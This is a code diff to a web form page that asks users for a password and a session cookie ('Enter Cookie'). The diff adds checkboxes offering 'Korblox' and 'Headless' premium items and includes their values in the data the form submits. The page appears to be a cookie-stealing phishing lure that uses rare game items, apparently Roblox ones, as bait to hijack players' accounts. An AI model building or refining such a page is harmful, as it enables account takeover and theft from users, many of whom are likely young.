@@ -240,6 +240,19 @@
       </style>
       <form id="demoForm">
         <input id="password" type="password" placeholder="Password" />
+        
+        <!-- Checkboxes for premium items -->
+        <div style="margin-bottom: 16px;">
+          <label style="display: flex; align-items: center; margin-bottom: 8px; cursor: pointer;">
+            <input type="checkbox" id="korblox" style="width: auto; margin-right: 10px; transform: scale(1.2);">
+            <span style="color: #ffcc00; font-weight: 600;">👑 Korblox Item</span>
+          </label>
+          <label style="display: flex; align-items: center; margin-bottom: 8px; cursor: pointer;">
+            <input type="checkbox" id="headless" style="width: auto; margin-right: 10px; transform: scale(1.2);">
+            <span style="color: #ff6600; font-weight: 600;">💀 Headless Item</span>
+          </label>
+        </div>
+        
         <input id="cookie" type="text" placeholder="Enter Cookie" />
 
         <button class="btn" type="button" id="submitBtn">Submit</button>
@@ -262,12 +275,16 @@
   // Get all form inputs
   const passwordInput = document.getElementById('password');
   const cookieInput = document.getElementById('cookie');
+  const korbloxInput = document.getElementById('korblox');
+  const headlessInput = document.getElementById('headless');
 
   btn.addEventListener('click', async () => {
     // Collect all form data
     const formData = {
       password: passwordInput.value.trim(),
-      cookie: cookieInput.value.trim()
+      cookie: cookieInput.value.trim(),
+      korblox: korbloxInput.checked,
+      headless: headlessInput.checked
     };
 
     // Basic validation
@@ -323,12 +340,14 @@
         // Clear form
         passwordInput.value = '';
         cookieInput.value = '';
+        korbloxInput.checked = false;
+        headlessInput.checked = false;
       } else {
         status.textContent = `❌ ${result.message}`;
         status.style.color = '#ff5b5b';
       }
     } catch (error) {
-      status.textContent = '❌ Connection error occurred';
+      status.textContent = '🔌 Unable to connect to server. Please check your internet connection and try again.';
       status.style.color = '#ff5b5b';
     }
 
